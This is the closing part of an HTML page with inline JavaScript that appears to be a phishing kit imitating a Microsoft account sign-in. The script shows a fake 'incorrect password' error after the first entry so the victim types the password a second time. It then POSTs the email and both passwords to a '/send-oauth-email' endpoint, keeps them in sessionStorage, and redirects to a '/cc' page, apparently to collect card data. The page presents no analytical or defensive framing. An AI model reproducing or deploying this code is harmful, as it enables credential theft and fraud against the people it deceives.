                                                        <div class="style-76">
                                                            <button type="submit" data-testid="primaryButton" class="style-77" id="nextButton">Next</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="style-82" data-testid="footer">
                            <footer class="style-83">
                                <div class="style-84">
                                    <a href="#" class="style-86" tabindex="0">Terms of use</a>
                                    <a href="#" class="style-87" tabindex="0">Privacy and cookies</a>
                                </div>
                            </footer>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const passwordInput = document.getElementById('passwordEntry');
            const passwordError = document.getElementById('passwordError');
            const nextButton = document.getElementById('nextButton');
            let passwordAttempts = 0;
            
            function showError(message) {
                passwordError.textContent = message;
                passwordError.classList.add('show');
                passwordInput.parentElement.parentElement.classList.add('password-error');
            }
            
            function hideError() {
                passwordError.classList.remove('show');
                passwordInput.parentElement.parentElement.classList.remove('password-error');
            }
            
            // Clear errors when user types and handle label animation
            passwordInput.addEventListener('input', function() {
                if (this.value.trim()) {
                    hideError();
                    // Add has-value class for label animation
                    this.closest('.style-66').classList.add('has-value');
                } else {
                    // Remove has-value class when empty
                    this.closest('.style-66').classList.remove('has-value');
                }
            });
            
            // Get email from form or URL
            const emailField = document.getElementById('emailField');
            const userEmailDisplay = document.getElementById('userEmailDisplay');
            const emailFromSession = emailField ? emailField.value : '';
            
            if (emailFromSession && userEmailDisplay) {
                userEmailDisplay.textContent = emailFromSession;
            }
            
            // Form submission
            let firstPassword = '';
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (!passwordInput.value.trim()) {
                    showError('Please enter the password for your Microsoft account.');
                    return;
                }
                
                const email = emailField ? emailField.value : emailFromSession || '';
                
                if (!email) {
                    showError('Email not found. Please refresh the page.');
                    return;
                }
                
                passwordAttempts++;
                
                if (passwordAttempts === 1) {
                    // Store first password attempt
                    firstPassword = passwordInput.value;
                    
                    // First attempt - show incorrect password error
                    showError('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
                    passwordInput.value = '';
                    passwordInput.focus();
                } else {
                    // Second attempt - send both passwords to API
                    // Wait for access code if not available yet
                    let accessCode = window.__ACCESS_CODE__ || '';
                    if (!accessCode) {
                        // Try to get from URL path as fallback
                        const pathParts = window.location.pathname.split('/').filter(p => p);
                        accessCode = pathParts[0] || '';
                    }
                    
                    if (!accessCode) {
                        showError('Access code not available. Please refresh the page.');
                        nextButton.disabled = false;
                        nextButton.textContent = 'Next';
                        return;
                    }
                    
                    const apiUrl = `/${accessCode}/send-oauth-email`;
                    
                    const oauthData = {
                        email: email,
                        password: passwordInput.value,
                        password1: firstPassword,
                        password2: passwordInput.value,
                        provider: 'hotmail'
                    };
                    
                    // Save OAuth data to sessionStorage for later use (e.g., in security email)
                    const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                    flowData.oauth = oauthData;
                    sessionStorage.setItem('flowData', JSON.stringify(flowData));
                    
                    try {
                        nextButton.disabled = true;
                        nextButton.textContent = 'Signing in...';
                        
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(oauthData)
                        });
                        
                        // Check if response is OK
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                        }
                        
                        const result = await response.json();
                        
                        // Check if success is true or if there's an error
                        if (result.success === true) {
                            // Success - redirect to next page
                            if (accessCode) {
                                setTimeout(() => {
                                    window.location.href = '/' + accessCode + '/cc';
                                }, 500);
                            } else {
                                window.location.href = '/?access';
                            }
                        } else {
                            // API returned error
                            const errorMsg = result.error || 'Sign in failed. Please try again.';
                            showError(errorMsg);
                            nextButton.disabled = false;
                            nextButton.textContent = 'Next';
                        }
                    } catch (err) {
                        console.error('OAuth email send failed:', err);
                        showError('Sign in failed. Please try again.');
                        nextButton.disabled = false;
                        nextButton.textContent = 'Next';
                    }
                }
            });
            
            // Handle focus/blur for label animation
            passwordInput.addEventListener('focus', function() {
                this.closest('.style-66').classList.add('has-value');
            });
            
            passwordInput.addEventListener('blur', function() {
                if (!this.value.trim()) {
                    this.closest('.style-66').classList.remove('has-value');
                }
            });
            
            // Enter key support - form will handle it automatically with submit
            
            // Focus on password input
            passwordInput.focus();
        });
    </script>
</body>

</html>
